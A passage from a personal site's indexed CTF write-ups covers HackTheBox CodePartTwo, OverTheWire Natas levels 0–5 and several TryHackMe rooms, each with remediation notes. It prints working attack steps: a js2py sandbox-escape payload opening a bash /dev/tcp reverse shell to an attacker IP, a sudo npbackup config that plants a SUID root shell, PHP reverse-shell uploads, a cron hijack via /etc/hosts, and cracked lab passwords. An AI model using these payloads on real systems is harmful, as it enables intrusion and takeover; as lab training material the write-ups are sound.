sandboxing, which allows JavaScript code to access Python internals through object introspection. This can be abused to reach system-level functions such as `subprocess.Popen`, resulting in full command execution on the server.\n</code></pre> <p>I located a public exploit PoC on GitHub:</p> <p>https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#exploitation-initial-foothold","title":"Exploitation \u2013 Initial Foothold","text":"<p>I tested the exploit payload inside the dashboard editor. My first attempt resulted in errors.</p> <p></p> <p>After tweaking the payload and configuring a reverse shell, I successfully obtained a shell connection back to my machine.</p> <p></p> <p>Below is the final working payload used to gain a reverse shell (only the attacker IP and port need modification):</p> <pre><code>var cmd = \"bash -c \\\"bash -i &gt;&amp; /dev/tcp/1&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1\\\"\";\nvar hacked, bymarve, n11, getattr, obj;\n\nhacked = Object.getOwnPropertyNames({});\nbymarve = hacked.__getattribute__;\nn11 = bymarve(\"__getattribute__\");\nobj = n11(\"__class__\").__base__;\ngetattr = obj.__getattribute__;\n\nfunction findpopen(o) {\n    var result, i, item;\n    var subclasses = o.__subclasses__();\n    for(i = 0; i &lt; subclasses.length; i++) {\n        item = subclasses[i];\n        if(item.__module__ == \"subprocess\" &amp;&amp; item.__name__ == \"Popen\") {\n            return item;\n        }\n        if(item.__name__ != \"type\" &amp;&amp; (result = findpopen(item))) {\n            return result;\n        }\n    }\n    return null;\n}\n\nn11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();\nconsole.log(n11);\nn11;\n</code></pre>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#post-exploitation-enumeration","title":"Post-Exploitation Enumeration","text":"<p>With a shell obtained, I began enumerating the system. Inside <code>/home</code>, I discovered another user marco</p> <p></p> <p>I recalled that the application database <code>users.db</code> was empty when accessed locally. Since I now had server access, I inspected it again.</p> <pre><code>sqlite3 users.db\n\nsqlite&gt; .tables\nsqlite&gt; SELECT * FROM user;\n</code></pre> <p>This time, the database contained password hashes for multiple users, including marco, app, and the user account I had created earlier (johhny).</p> <p></p> <p>My target was marco.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#credential-cracking-lateral-movement","title":"Credential Cracking &amp; Lateral Movement","text":"<p>I copied Marco\u2019s password hash and submitted it to crackstation.net. The hash cracked successfully.</p> <ul> <li>Password: <code>sweetangelbabylove</code></li> </ul> <p></p> <p>Using these credentials, I logged in as Marco via SSH and retrieved the user flag.</p> <pre><code>ssh marco@&lt;TARGET-IP&gt;\n</code></pre> <p></p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#privilege-escalation","title":"Privilege Escalation","text":"<p>With access to marco\u2019s account via SSH, I checked his sudo privileges as the first Privilege Escalation vector.</p> <p>The output revealed that Marco could run the following command as any user without a password</p> <pre><code>/usr/local/bin/npbackup-cli\n</code></pre> <p></p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#privilege-escalation-npbackup-cli-abuse","title":"Privilege Escalation: npbackup-cli Abuse","text":""},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#background","title":"Background","text":"<p><code>npbackup-cli</code> is a Python-based backup utility that uses restic. It reads a YAML configuration file (<code>npbackup.conf</code>) which supports execution of commands after backup completion via <code>post_exec_commands</code>.</p> <p>The vulnerability here is a sudo misconfiguration. Marco is allowed to run <code>npbackup-cli</code> as root, meaning any commands defined in the configuration file will be executed with full root privileges.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#exploitation-steps","title":"Exploitation Steps","text":"<p>The default configuration file in <code>/home/marco</code> was owned by root and could not be edited.</p> <p>img21</p> <p>I thus copied it to <code>/tmp</code>, which is writable.</p> <pre><code>cp /home/marco/npbackup.conf /tmp/npbackup.conf\n</code></pre> <p></p> <p>I modified the copied configuration to target the <code>/root</code> directory and added commands to create a SUID root shell.</p> <pre><code>cat &gt; /tmp/npbackup.conf &lt;&lt; 'EOF'\nconf_version: 3.0.1\naudience: public\nrepos:\n  default:\n    repo_uri: /tmp/dummy-repo\n    repo_group: default_group\n    backup_opts:\n      paths:\n        - /root\n      source_type: folder_list\n    repo_opts:\n      repo_password: dummy\n      retention_policy: {}\ngroups:\n  default_group:\n    backup_opts:\n      post_exec_commands:\n        - cp /bin/bash /tmp/rootbash\n        - chmod u+s /tmp/rootbash\nEOF\n</code></pre> <p></p> <p>I ensured the file was writable.</p> <pre><code>chmod 666 /tmp/npbackup.conf\n</code></pre> <p></p> <p>I then executed the backup as root.</p> <pre><code>sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b\n</code></pre> <p></p> <p>Even though an error appeared, the post-execution commands had already run.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#root-access","title":"Root Access","text":"<p>I spawned a root shell using the SUID binary.</p> <pre><code>/tmp/rootbash -p\n</code></pre> <p></p> <p>Finally, I retrieved the root flag.</p> <pre><code>cat /root/root.txt\n</code></pre> <p></p> <p>Room Completed</p> <p></p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#remediation-hardening-recommendations","title":"Remediation &amp; Hardening Recommendations","text":"<ul> <li> <p>Do not execute user-supplied code server-side. If required, isolate execution using containers or dedicated sandboxing solutions.</p> </li> <li> <p>Update or remove vulnerable dependencies, particularly outdated libraries such as js2py.</p> </li> <li> <p>Remove hardcoded secrets from source code and store them securely using environment variables.    </p> </li> <li> <p>Restrict database file permissions to prevent unauthorized access to credential data.</p> </li> <li> <p>Harden sudo configurations by avoiding unrestricted execution of scripts or tools like <code>npbackup-cli</code>, especially those supporting command execution hooks.</p> </li> </ul>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#lessons-learned","title":"Lessons Learned","text":"<p>This machine shows how small misconfigurations can combine into a full compromise. Executing user-supplied code, outdated libraries, and exposed secrets made it easy to escalate from a web app to root. It\u2019s a strong reminder to enforce least privilege, manage dependencies, and secure sensitive data</p>"},{"location":"writeups/platforms/overthewire/","title":"Natas \u2014 Web Security WarGame\u00b6","text":"<p>Welcome to Natas, OverTheWire\u2019s legendary web exploitation series.</p> <p>These writeups cover levels 0\u20135, with screenshots, explanations, and learning notes.</p>"},{"location":"writeups/platforms/overthewire/#completed-levels","title":"Completed Levels\u00b6","text":"<ul> <li>Natas 0</li> <li>Natas 1</li> <li>Natas 2</li> <li>Natas 3</li> <li>Natas 4</li> <li>Natas 5</li> <li>\u2026more levels coming soon \ud83d\udd12</li> </ul>"},{"location":"writeups/platforms/overthewire/natas/","title":"Natas \u2014 Web Security WarGame\u00b6","text":"<p>Welcome to Natas, OverTheWire\u2019s legendary web exploitation series.</p> <p>These writeups cover levels 0\u20135, with screenshots, explanations, and learning notes.</p>"},{"location":"writeups/platforms/overthewire/natas/#completed-levels","title":"Completed Levels\u00b6","text":"<ul> <li>Natas 0</li> <li>Natas 1</li> <li>Natas 2</li> <li>Natas 3</li> <li>Natas 4</li> <li>Natas 5</li> <li>\u2026more levels coming soon \ud83d\udd12</li> </ul>"},{"location":"writeups/platforms/overthewire/natas/level0/natas0/","title":"Natas0","text":""},{"location":"writeups/platforms/overthewire/natas/level0/natas0/#description","title":"Description","text":"<pre><code>Username: natas0\nPassword: natas0\nURL:      http://natas0.natas.labs.overthewire.org\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level0/natas0/#walkthrough","title":"Walkthrough","text":"<p>Logged in</p> <p></p> <p>View source code</p> <p></p> <pre><code>password1 : 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level1/natas1/","title":"Natas1","text":""},{"location":"writeups/platforms/overthewire/natas/level1/natas1/#description","title":"Description","text":"<pre><code>Username: natas1\nURL:      http://natas1.natas.labs.overthewire.org\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level1/natas1/#walkthrough","title":"Walkthrough","text":"<p>Viewed the Webpage</p> <p></p> <p>So, I tried to right click it, but got nothing</p> <p></p> <p>Normally, to view the webpage, we use <code>CTRL+U</code> and we see the source code</p> <p></p> <p>``` password2 : TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI</p>"},{"location":"writeups/platforms/overthewire/natas/level2/natas2/","title":"Natas2","text":""},{"location":"writeups/platforms/overthewire/natas/level2/natas2/#description","title":"Description","text":"<pre><code>Username: natas2\nURL:      http://natas2.natas.labs.overthewire.org\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level2/natas2/#walkthrough","title":"Walkthrough","text":"<p>Accessed the webpage</p> <p></p> <p>Tried source code</p> <p></p> <p>There was nothing there, but I got an image link. </p> <p></p> <p>Upon visiting it, there was nothing but the url seemed interesting I navigated back to the files directory and I saw a file, users.txt</p> <p></p> <p>I used <code>wget</code> command to get the file and I viewed the contents of users.txt. For it, I got a 401 error message meaning I needed to be authenticated</p> <pre><code>wget --user=natas2 --password=TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt\n</code></pre> <p></p> <p>Contents of users.txt</p> <p></p> <pre><code>password3 : 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level3/natas3/","title":"Natas3","text":""},{"location":"writeups/platforms/overthewire/natas/level3/natas3/#description","title":"Description","text":"<pre><code>Username: natas3\nURL:      http://natas3.natas.labs.overthewire.org\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level3/natas3/#walkthrough","title":"Walkthrough","text":"<p>Accessed the webpage</p> <p></p> <p>Viewed the source code</p> <p></p> <p>Since there was nothing, I decided to visit robots.txt</p> <p>Robots.txt is a file in which the directories plus files that you don't want to be indexed by google web crawlers you place</p> <p></p> <p>In it, was a directory <code>s3cr3t</code></p> <p></p> <p>The contents had <code>users.txt</code> file, thus we get it</p> <p><pre><code>wget --user=natas3 --password=3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt\n</code></pre> </p> <p>Opened the file and got the creds for natas4</p> <p></p> <pre><code>password4 : QryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level4/natas4/","title":"Natas4","text":""},{"location":"writeups/platforms/overthewire/natas/level4/natas4/#description","title":"Description","text":"<pre><code>Username: natas4\nURL:      http://natas4.natas.labs.overthewire.org\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level4/natas4/#walkthrough","title":"Walkthrough","text":"<p>Viewed the source code and got a text saying : <code>Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\"</code></p> <p></p> <p>Upon refreshing the page, we get this : <code>Access disallowed. You are visiting from \"http://natas4.natas.labs.overthewire.org/\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\"</code></p> <p></p> <p>As per the message, we note that we need to forward a request from the natas5 URL, so we ought to edit the Refer to natas5 url Capture the request with burpsuite and head over to the refer part</p> <p></p> <p>Edit it and input the url : <code>http://natas5.natas.labs.overthewire.org/</code></p> <p></p> <p>We are told access granted and we are given the password for the next level</p> <pre><code>password5 : 0n35PkggAPm2zbEpOU802c0x0Msn1ToK\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level5/natas5/","title":"Natas5","text":""},{"location":"writeups/platforms/overthewire/natas/level5/natas5/#description","title":"Description","text":"<pre><code>Username: natas5\nURL:      http://natas5.natas.labs.overthewire.org\n</code></pre>"},{"location":"writeups/platforms/overthewire/natas/level5/natas5/#walkthrough","title":"Walkthrough","text":"<p>Viewing the webpage reveals to us that access disallowed and we are not logged in.</p> <p></p> <p>Whenever I see anything concerning authentication, the first thing that coms to my mind is cookies. I thus decide to inspect the webpage for cookies</p> <p></p> <p>We find a cookie named <code>loggedin</code> and its value is 0. I changed it to 1</p> <p></p> <p>Changing it to 1,  we are now logged in and we have the password</p> <p></p> <pre><code>password : 0RoJwHdSKWFTYR5WuiAewauSuNaBXned\n</code></pre>"},{"location":"writeups/platforms/tryhackme/","title":"TryHackMe Writeups\u00b6","text":"<p>TryHackMe provides hands\u2011on cybersecurity labs that reinforce practical exploitation skills.</p> <p>This section contains my curated collection of room writeups \u2014 structured, concise, and focused on methodology.</p>"},{"location":"writeups/platforms/tryhackme/#difficulty-categories","title":"Difficulty Categories\u00b6","text":"<p>Choose a tier and dive in:</p> <ul> <li>Easy Rooms</li> <li>Medium Rooms</li> <li>Hard Rooms</li> </ul> <p>This collection grows continuously as I grind more rooms, sharpen skills, and prepare for professional certifications.</p>"},{"location":"writeups/platforms/tryhackme/easy/","title":"Easy Machines\u00b6","text":"<p>This section features beginner-friendly TryHackMe machines designed for foundational skills in reconnaissance, enumeration, and basic exploitation. Each room emphasizes practical learning with guided environments ideal for newcomers to cybersecurity.</p>"},{"location":"writeups/platforms/tryhackme/easy/#completed-machines","title":"Completed Machines\u00b6","text":"<ul> <li>Anonforce</li> <li>Dav</li> <li>mKingdom</li> <li>Thompson</li> </ul> <p>More easy machines will be added as progress continues through TryHackMe's beginner track.</p>"},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/","title":"Anonforce","text":""},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/#synopsis","title":"Synopsis","text":"<p>The Anonforce TryHackMe room features a critically misconfigured vsftpd FTP server with anonymous access enabled and\u00a0<code>anon_root=/</code>, exposing the entire Linux root filesystem. This vulnerability allowed me to unauthenticated enumerate sensitive files, crack a GPG key, extract\u00a0<code>/etc/shadow</code>, compromise the root password, and gain full system access via SSH.</p>"},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/#reconnaissance","title":"Reconnaissance","text":"<p>I began by running an Nmap scan to identify open ports and services:</p> <pre><code>nmap -sC -sV 10.49.161.36\n</code></pre> <p>This revealed two open ports:\u00a021/FTP\u00a0and\u00a022/SSH.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/#enumeration","title":"Enumeration","text":"<p>I targeted the FTP service on port 21 with <code>anonymous</code> credentials. The login succeeded without a password, dropping me directly into the root directory\u00a0<code>/</code>\u00a0(no chroot jail). This severe misconfiguration violated vsftpd security defaults</p> <p></p> <p>I navigated to\u00a0<code>/home</code>\u00a0and identified user\u00a0melodias</p> <p></p> <p>Within the user meliodas was the user flag</p> <p></p> <p>I downloaded and verified the user flag contents.  </p> <p></p> <p>I probed\u00a0<code>/etc/shadow</code>\u00a0(inaccessible directly) and SSH keys (none found). A non-standard, world-writable directory\u00a0<code>notread</code>\u00a0caught my attention.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/#exploitation","title":"Exploitation","text":"<p>There are two files : <code>backup.pgp</code> and <code>private.asc</code> Doing a little research I found what the two files might be. <code>private.asc</code>\u00a0is a text file containing a private encryption key used to securely unlock and access encrypted data.\u00a0<code>backup.pgp</code>\u00a0is an encrypted backup file that stores protected data or documents, which can only be accessed and decrypted with the correct private key or passphrase</p> <p>To download those files to your local device, use</p> <pre><code>mget *\n</code></pre> <p>In this engagement, it appears that we need to use the private key <code>private.asc</code> to decrypt <code>backup.pgp</code>. To achieve this, we need to import the key then decrypt the file</p> <p>So, I imported the file using</p> <pre><code>gpg --import private.asc\n</code></pre> <p>However, it prompted me for a passphrase that I do not know</p> <p></p> <p>It was there that I resorted to bruteforce the passphrase on <code>private.asc</code> using john the ripper, since gpg keys use extractable hashes</p> <p>I first converted the key into a format john the ripper can understand </p> <pre><code>gpg2john private.asc &gt; gpg.hash\n</code></pre> <p></p> <p>I then cracked the hash using john the ripper</p> <pre><code>john -w=/usr/share/wordlists/rockyou.txt gpg.hash\n</code></pre> <p></p> <p>I found the passphrase as <code>xbox360</code></p> <p>So, I now imported the file once more and inserted the passphrase</p> <pre><code>gpg --import private.asc\n</code></pre> <p></p> <p>The key was successfully imported. The final step now was to decrypt the encrypted file using the imported key</p> <pre><code>gpg --output decrypted.file --decrypt backup.pgp\n</code></pre> <p></p> <p>It accepted and I viewed the contents of the <code>decrypted.file</code>. It seemed to be the contents of the <code>/etc/shadow</code> file</p> <p>In it, was the root hash which I copied at and attempted to crack it with john the ripper once more</p> <p></p> <pre><code>$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0\n</code></pre> <p>I copied the root hash into a file and cracked it</p> <pre><code>john -w=/usr/share/wordlists/rockyou.txt root.hash\n</code></pre> <p></p> <p>I got the root hash which is <code>hikari</code></p>"},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/#privilege-escalation","title":"Privilege Escalation","text":"<p>I established SSH connection as root:</p> <pre><code>ssh root@10.49.132.128\n# Password: hikari\n</code></pre> <p>Retrieved\u00a0root.txt\u00a0flag from\u00a0<code>/root</code>\u00a0directory.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/anonforce/anonforce/#remediation-hardening-recommendations","title":"Remediation &amp; Hardening Recommendations","text":"<p>Root Cause:\u00a0vsftpd configuration with\u00a0<code>anon_root=/</code>\u00a0exposing entire filesystem to anonymous users.</p> <p>Immediate Hardening Steps:</p> <ol> <li>Edit\u00a0<code>/etc/vsftpd.conf</code>:</li> </ol> <pre><code>anonymous_enable=NO          # Disable anonymous access completely\n# OR for limited anonymous access:\n# anon_root=/var/ftp         # Isolate to secure directory\nanon_upload_enable=NO        # Prevent anonymous uploads\nchroot_local_user=YES        # Chroot local users to home directories\nwrite_enable=NO              # Disable file writes unless required\n</code></pre> <ol> <li>Create secure anonymous directory\u00a0(if retaining anonymous access):</li> </ol> <pre><code>mkdir -p /var/ftp/pub\nchown root:root /var/ftp\nchmod 755 /var/ftp\n</code></pre> <ol> <li>Restart vsftpd service:</li> </ol> <pre><code>systemctl restart vsftpd\n</code></pre> <ol> <li>Verification: Anonymous FTP login now denied.</li> </ol> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/dav/dav/","title":"Dav","text":""},{"location":"writeups/platforms/tryhackme/easy/dav/dav/#reconnaissance","title":"Reconnaissance","text":"<p>I began the engagement with a comprehensive Nmap scan to identify open ports and services running on the target.</p> <pre><code>nmap -sC -sV 10.80.131.217\n</code></pre> <p></p> <p>The scan revealed only port 80 (HTTP) was open, immediately focusing my attention on web-based attack vectors.</p>"},{"location":"writeups/platforms/tryhackme/easy/dav/dav/#enumeration","title":"Enumeration","text":"<p>Next, I performed directory enumeration using Gobuster to discover hidden endpoints.</p> <pre><code>gobuster dir -u http://10.80.131.217/ -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p></p> <p>The 401 Unauthorized response on <code>/webdav</code> stood out as the most promising attack surface.</p>"},{"location":"writeups/platforms/tryhackme/easy/dav/dav/#webdav-protocol-analysis","title":"WebDAV Protocol Analysis","text":"<p>WebDAV (Web Distributed Authoring and Versioning) is an extension of the HTTP protocol that enables remote file management capabilities. As per my research, WebDAV allows users to edit files directly in the cloud.</p> <p>The core idea of WebDAV is simple: instead of just downloading files from a server, you can also upload, edit, delete, and move them\u2014just like working with a regular folder on your computer.</p> <p>WebDAV supports these critical remote file operations via HTTP extensions:</p> <ul> <li> <p>PUT - Upload files</p> </li> <li> <p>GET - Download files</p> </li> <li> <p>PROPFIND - List directories and properties</p> </li> <li> <p>DELETE - Remove files</p> </li> <li> <p>MOVE/COPY - File manipulation</p> </li> </ul> <p>Additional WebDAV explanation</p> <p>I tested for authentication bypass:</p> <pre><code>curl -u \"\" http://10.80.131.217/webdav/\n</code></pre> <p></p> <p>Proper credentials were required.</p>"},{"location":"writeups/platforms/tryhackme/easy/dav/dav/#webdav-exploitation","title":"WebDAV Exploitation","text":"<p>To interact with the WebDAV service, I used cadaver, a command-line WebDAV client:</p> <pre><code>cadaver http://10.80.131.217/webdav\n</code></pre> <p></p> <p>Initial credential attempts (admin:admin, guest:guest, admin:password) failed. Further research revealed XAMPP WebDAV default credentials:</p> <p>Helper: WebDAV XAMPP 1.7.3 default</p> <pre><code>username: wampp \npassword: xampp\n</code></pre> <p>Next was to access webdav using the obtained creds and indeed I got in</p> <p></p> <p>I found one file there which contained the username and password hash.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/dav/dav/#initial-shell-and-privilege-enumeration","title":"Initial Shell and Privilege Enumeration","text":"<p>With WebDAV access secured, I crafted a PHP reverse shell (<code>shell.php</code>), carefully editing the IP and port to match my attacking machine, then uploaded it:</p> <pre><code>put shell.php\n</code></pre> <p></p> <p>Back on my Kali machine, I fired up a Netcat listener:</p> <pre><code>rlwrap nc -lvnp 4444\n</code></pre> <p>I navigated to <code>http://10.80.131.217/webdav/shell.php</code> in my browser and watched the magic happen\u2014reverse shell connected as www-data! </p> <p></p> <p>The raw shell was clunky, so I upgraded it step by step. First, I spawned a basic TTY:</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <p>Then the full stabilization ritual:</p> <pre><code># Background the shell with \nCtrl+Z stty raw -echo fg ls export SHELL=/bin/bash export TERM=screen stty rows 38 columns 116 reset\n</code></pre> <p>Now with a proper TTY, I started hunting. I  navigated to <code>/home</code> and discovered two users: <code>merlin</code> and <code>wampp</code>:  </p> <p></p> <p>Checking Merlin's directory revealed the user flag:  </p> <p></p> <p>Time for privilege escalation recon. I ran:</p> <pre><code>sudo -l\n</code></pre> <p>The output was pure gold:</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/dav/dav/#root-access","title":"Root Access","text":"<p>With this, I went to <code>gtfobins</code> to see how we can use this to our advantage</p> <p></p> <p>Apparently, the cat command can be leveraged to view the contents of files which have elevated privileges. So I set up the <code>/root/root.txt</code> to access the root flag</p> <p>And behold, we got the root flag</p> <pre><code>LFILE=/root/root.txt\nsudo cat \"$LFILE\n</code></pre> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/","title":"mKingdom","text":""},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/#reconnaissance","title":"Reconnaissance","text":"<p>I began by running an Nmap scan to identify open ports and services on the target machine:</p> <pre><code>nmap -sC -sV 10.10.154.223\n</code></pre> <p>This revealed an open port and service to investigate further.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/#enumeration","title":"Enumeration","text":"<p>I Visited the web service on the target and surfed it</p> <p></p> <p>I used gobuster to perform directory enumeration, which revealed an <code>/app</code> directory.</p> <p></p> <p>Navigating the site, I found a <code>jump</code> link redirecting to the <code>/castle</code> directory.</p> <p></p> <p>Using Wappalyzer, I identified the CMS used on the site as Concrete CMS 8.5.2.</p> <p></p> <p>At the bottom of the <code>/castle</code> directory, there was a login link.</p> <p></p> <p>Knowing the CMS as concrete5, I researched default credentials and found <code>admin:password</code> worked.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/#exploitation-concrete-cms-remote-code-execution","title":"Exploitation: Concrete CMS Remote Code Execution","text":"<p>Researching the CMS version uncovered a known vulnerability (HackerOne reference) allowing file upload exploitation by:</p> <ol> <li>Adding <code>php</code> to the allowed file types under \"Allow File Types\".</li> </ol> <p></p> <ol> <li>Uploading a PHP reverse shell (PentestMonkey\u2019s reverse shell).</li> </ol> <p></p> <ol> <li> <p>Configuring the shell with the attacker\u2019s IP (LHOST) and listening port.</p> </li> <li> <p>Launching a Netcat listener to catch the reverse shell.</p> </li> <li> <p>Triggering the uploaded file to obtain a shell.</p> </li> </ol> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/#initial-shell-and-privilege-enumeration","title":"Initial Shell and Privilege Enumeration","text":"<p>After capturing the shell, I stabilized it using:</p> <p></p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")' \n\nCTRL+Z stty raw -echo fg export SHELL=/bin/bash export TERM=screen stty rows 38 columns 116 reset\n</code></pre> <p>I then uploaded <code>linpeas.sh</code> for privilege escalation enumeration:</p> <pre><code># Attacker machine \npython3 -m http.server 8000\n\n# Target machine\nwget http://&lt;attacker-ip&gt;:8000/linpeas.sh\n</code></pre> <p>LinPEAS revealed credentials in a configuration file:</p> <p></p> <pre><code>&lt;?php\n\nreturn [\n    'default-connection' =&gt; 'concrete',\n    'connections' =&gt; [\n        'concrete' =&gt; [\n            'driver' =&gt; 'c5_pdo_mysql',\n            'server' =&gt; 'localhost',\n            'database' =&gt; 'mKingdom',\n            'username' =&gt; 'toad',\n            'password' =&gt; 'toadisthebest',\n            'character_set' =&gt; 'utf8',\n            'collation' =&gt; 'utf8_unicode_ci',\n        ],\n    ],\n];\n</code></pre> <p>Noticing MySQL on port 3306 and port 631 open locally, I port-forwarded MySQL using Chisel:</p> <p></p> <pre><code># Attacker machine \nchisel server --reverse --port 5555 \n</code></pre> <p></p> <pre><code># Target machine \n./chisel client &lt;attacker-ip&gt;:5555 R:127.0.0.1:3306\n</code></pre> <p></p> <p>This allowed me to connect to the database remotely and explore.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/#lateral-movement-and-further-enumeration","title":"Lateral Movement and Further Enumeration","text":"<p>Logging into MySQL with the discovered credentials yielded no useful data, so I switched users to <code>toad</code> using the password found earlier:</p> <pre><code>su toad \n# Password: toadisthebest`\n</code></pre> <p>Rerunning LinPEAS as user <code>toad</code> uncovered a suspicious Base64 string in an environment variable: <code>PWD_token=aWthVGVOVEFOdEVTCg==</code></p> <p></p> <pre><code>echo \"aWthVGVOVEFOdEVTCg==\" | base64 -d \n# Output: ikaTeNTANtES`\n</code></pre> <p>This turned out to be the password for user <code>mario</code>, allowing me to switch to <code>mario</code>. Though the flag was protected by permissions, copying it to <code>/tmp</code> allowed me to read it.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/mKingdom/mKingdom/#persistence-and-root-access","title":"Persistence and Root Access","text":"<p>To identify ongoing system activity, I uploaded and ran <code>pspy64</code> to monitor running processes in real-time:</p> <pre><code># Attacker machine\n python3 -m http.server 8000\n\n # Target machine \nwget http://&lt;attacker-ip&gt;:8000/pspy64 \nchmod +x pspy64 \n./pspy64\n</code></pre> <p>This revealed a root cron job running every minute that fetched and executed a remote shell script via:</p> <pre><code>curl mkingdom.thm:85/app/castle/application/counter.sh\n</code></pre> <p></p> <p>Seeing that <code>/etc/hosts</code> was writable, I redirected <code>mkingdom.thm</code> to my IP by modifying <code>/etc/hosts</code>. I experienced issues when trying to modify the file using text editors like nano, I thus ran the command below</p> <pre><code>tee /etc/hosts &gt; /dev/null &lt;&lt;EOF \n127.0.0.1       localhost\n10.9.3.255       mkingdom.thm\n127.0.0.1       backgroundimages.concrete5.org\n127.0.0.1       www.concrete5.org\n127.0.0.1       newsflow.concrete5.org\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\nEOF\n</code></pre> <p>I hosted a malicious version of <code>counter.sh</code>, containing a reverse shell payload, on a Python HTTP server that replicated the expected path.  i.e <code>app/castle/application/counter.sh</code>. </p> <p>I started the server at the folder containing app, which was mKingdom, i.e <code>mKingdom/app/castle/application/counter.sh</code></p> <p></p> <p>The payload was:</p> <pre><code>#!/bin/bash \nbash -c 'exec bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1'\n</code></pre> <p>When the cron job executed, it retrieved and ran my payload as root, granting me a root shell and full control of the machine.</p> <p></p> <p>I  then copied the flag to the /tmp directory from where I was able to read the flag</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/thompson/thompson/","title":"Thompson","text":""},{"location":"writeups/platforms/tryhackme/easy/thompson/thompson/#scanning","title":"Scanning","text":"<p>I began by running an Nmap scan on the target, which revealed 3 open ports. Port 8080 immediately caught my attention as it exposed a web service.</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/thompson/thompson/#enumeration","title":"Enumeration","text":"<p>Next, I visited port 8080 in my browser and saw the classic Apache Tomcat landing page. I noted that it was running version 8.5.5</p> <p></p> <p>Apache Tomcat Overview</p> <p>Apache Tomcat is an open-source Java servlet container and web server that implements the Java Servlet, JavaServer Pages (JSP), and WebSocket specifications. Unlike traditional web servers (Apache/Nginx) or CMS platforms (WordPress), Tomcat specifically executes server-side Java code through JSP files and servlets, making it popular for enterprise Java web applications.</p> <p>I noticed three key endpoints available on the landing page:</p> <ul> <li> <p><code>/manager/html</code> - Webapp deployment interface</p> </li> <li> <p><code>/host-manager/html</code> - Virtual host management</p> </li> <li> <p><code>/manager/status</code> - Server status page</p> </li> </ul> <p>The Manager (<code>/manager/html</code>) and Host-Manager (<code>/host-manager/html</code>) applications are built-in administrative interfaces:</p> <ul> <li> <p>Manager: Allows authenticated users to deploy, undeploy, start, stop, and reload web applications (WAR files) across the entire Tomcat instance</p> </li> <li> <p>Host-Manager: Manages virtual hosts (multiple websites on different domains)</p> </li> </ul> <p>Critical Misconfiguration: When these apps are enabled with weak/default credentials, attackers gain the ability to upload malicious WAR files. Tomcat automatically extracts and executes JSP code within these WARs, enabling arbitrary remote code execution (RCE)</p>"},{"location":"writeups/platforms/tryhackme/easy/thompson/thompson/#tomcat-exploitation","title":"Tomcat Exploitation","text":"<p>I clicked on the Manager App link, which prompted me for authentication credentials.</p> <p></p> <p>Since I didn't have credentials yet, I pressed Cancel. This revealed a goldmine - the 401 Unauthorized page displayed example credentials right in the error message!</p> <p></p> <pre><code>username: tomcat\npassword: s3cret\n</code></pre> <p>I immediately tried these credentials: 